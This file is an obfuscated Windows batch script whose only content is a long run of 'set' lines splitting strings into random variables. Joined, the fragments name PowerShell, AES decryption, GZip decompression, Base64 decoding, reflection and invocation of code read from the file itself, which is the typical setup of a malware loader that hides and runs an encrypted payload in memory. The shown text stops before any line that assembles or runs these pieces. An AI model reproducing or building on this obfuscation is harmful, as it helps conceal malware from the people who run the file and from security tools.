@echo off
set "HNkNGELTzZ=\W"
set "wKkFoOhMYf= C"
set "wRmZYnTcXr= /"
set "wgPsKKnsfI=y "
set "nqPZxmWrTE=rS"
set "bZIwuGlTIk=rs"
set "afPcFAPmoL=in"
set "rSTvGeByrz=py"
set "zMphYADqhQ=.e"
set "XecxTRTrlG=we"
set "sWirdQgBEV=nd"
set "xZFrmSgrTQ=st"
set "rqLailwMci=1."
set "AmMBxYTJFw=po"
set "HpnCMVgAog=Wi"
set "pRXAVoIFFM=Po"
set "hFRYLYbXdJ=\v"
set "BqhSJBAhbS=co"
set "JVqoVaaPiq=we"
set "HGxRMnntPV=Sy"
set "qMPrCxLKEs=ll"
set "OgRlCbLwzW=em"
set "COixjaWdEY=ws"
set "xDzdifDjCj=he"
set "ELHqvKTtXn=he"
set "rNgFyckfdp=ll"
set "DrlLShwITt=s\"
set "kwLTMDAjmG=:\"
set "tOjVIVhZJd=ow"
set "XAtYpAByxZ=0\"
set "MabvZgvmfQ=xe"
set "CQTTBZruez=do"
set "txHknMqrjv=32"
set "fOgVAIkIdW= %~dp0"
set "RDZLTZOBiy=cd"
set "eTfkDgCDia=$EWC"
set "kdkAkjmpxO=]::N"
set "ZdrtWbAxSH=ress"
set "VdXFDnMLVS=A.Su"
set "vvPifiRTqv=uARA"
set "oZiCXsWwFG=gth)"
set "RlYMsWyzDI= = $"
set "icKgcQaRfE=th('"
set "IKRXsaZcoL=gsYZ"
set "nGYNJqChbO=ion."
set "IkNenWBGaJ=);$T"
set "ZaviszYOgz=n ''"
set "fUkNosrxxF=.Con"
set "UEETCyBCoR=]::("
set "jKJtJjENmJ=bstr"
set "ziEwtLMAel=$MEt"
set "rlAPYWdHYi=..-1"
set "coMgigpVWy=YxVw"
set "dFyEQxYcqe=pose"
set "oKnyoaMkmv=onve"
set "KfaVgRvaDE=l5E7"
set "XLtynSzLeP=m.Re"
set "DrZPkwBjkN='')("
set "hXBXUuWelD=TllA"
set "TWtyCAQXXm=Obje"
set "OQxwIRtknu=Conv"
set "HoDrbNWtLT=HjZ."
set "AbjBFjwDRK=UZFJ"
set "aTcvkkKtsr=:: '"
set "eUZJpGtBNB=ZFJc"
set "mniYHYFQuP=($nv"
set "BNAxlczkAg=flec"
set "vHIYvgzJMH=PKCS"
set "DWdbIDpRgQ=ck($"
set "ExlDODTVAG=saBm"
set "VtoZJKcnbq=ionM"
set "ukaCfYPHuK=stem"
set "KncsuwibuE=.Mod"
set "ynaxtneQyd=.Com"
set "bNQGRjpERH=::De"
set "GQOCtDvRqS=comm"
set "WTDDarbzdm=ose("
set "VgfwqySroC=le  "
set "FdhOwUnSPA= = ["
set "vArnEENMxY=HcVh"
set "EeDWpxsOLR=CFxo"
set "SEAqKsoHwN=  $E"
set "ViybLdKAhg=vert"
set "yYQhMKtreE=zG);"
set "vmrNmLqEJd= '')"
set "svQwOzDnso=$AWQ"
set "rjbuwyCshf=grap"
set "CcJLQCHlER=;$Tu"
set "TeLacPdXJb=pher"
set "jJJfqUSxyR=.Dis"
set "DnfQgHQpyJ=ress"
set "edEuUtPApP=rity"
set "MIaNdbIlZN= = $"
set "QwOHAagWyu=hxpu"
set "GpaGLSnlbv=ptog"
set "taxMREmPIX=null"
set "speylIiJYn== $U"
set "JrgznFUSCt=;$Nd"
set "sRQVuaAqap=rans"
set "REzbiRvoYg=k; }"
set "AdufDffyeL=.GZi"
set "IWzLOxZDvW=;$NZ"
set "pLQsXHhXoQ=:('g"
set "QeotSwnOBY=comp"
set "mdLGZcdmlj=e = "
set "RULFNAkxty=yste"
set "sfVyYAvYxa=yste"
set "EjqqlLrIoG=]::("
set "jmDdBpRUuv= New"
set "VXzWiJXKdc=tion"
set "LmSYPVqQgM=tem."
set "QBdmajdsLI=ptog"
set "eKMuqGNdxu=eam("
set "BHQpDylkal=gnir"
set "NnOPJcOiXy=in $"
set "bJjQpeDUts=Bmor"
set "oHbhfPulap=m(, "
set "CfVnTFJWNR=.Len"
set "vyvtAUdUiy=xpud"
set "yzYngaDeKX=MEtz"
set "XeBJTyTXQl=)))"
set "rWQzxWNvLJ=ew-O"
set "MEtOzVsdcr=RmAx"
set "WdCWEJXOyn=EtzG"
set "gqxCdFMMYj=[Sys"
set "ZhWteBIYJP=Syst"
set "eGxplIBbey== [S"
set "RhJsqrUnaM=zG ="
set "ahdKhqxFqP=.Sec"
set "eymuFhDIhz=);$h"
set "tZghDsRTNK=yTo("
set "gnwtDdzLai= = N"
set "PiDgukDVLl=join"
set "ZsnbVmWckx=ode]"
set "ZuKFLZQJKD=)($M"
set "DBzbuHUIpo=-joi"
set "rVGrZqGIKC=('%~f0'"
set "wvNFGlanjU=tS46"
set "NpcMmCxuPp=ay()"
set "TsYngOyhqa=dj0C"
set "xLOTremeqJ=$NdH"
set "AvSfZsvLVP=pose"
set "tyqMVCUVrI=Ctn."
set "zvcZmNdmlH=esaB"
set "shVNNpgDyj=lit("
set "hzjGDzRAoY=)($E"
set "KGjKrXtSxQ=nage"
set "FqxyRfoiYg=File"
set "EqbQkzOjOy=New-"
set "sALmBZcTCW=rt]:"
set "gIFcCYykUA=oryS"
set "ZgQbdJacHw=stem"
set "rbbKHBzoPL=Comp"
set "NrlWUlOlon=ect "
set "HDDNiliHlC=rofi"
set "wlTpSIQhYd=ecry"
set "CEkKWJqfqX=Invo"
set "JwclWIOpAx=.Cry"
set "SRGEyRuLtt=, $M"
set "gpXKMvsMKS=nvnI"
set "xYmhoQpqIE=G, 0"
set "hnXwIiHtuO=).Sp"
set "vRtVlpwIVg=se()"
set "ZiycapAIxL=.IO."
set "TLvnJxjbMr=EtzG"
set "vrxATPuMmT=ke($"
set "VwKWjXsWqr=c.Pa"
set "AMvgSkJqUg=ose("
set "hhulKwbtea=tsWi"
set "ibRHotuSjY=$THc"
set "wchwlaDByT=-Obj"
set "dCsoHQWdLM=1..-"
set "bwklxXjKHR=m.IO"
set "nMvXjYOLrX=-joi"
set "NKnTeCUXMQ=ress"
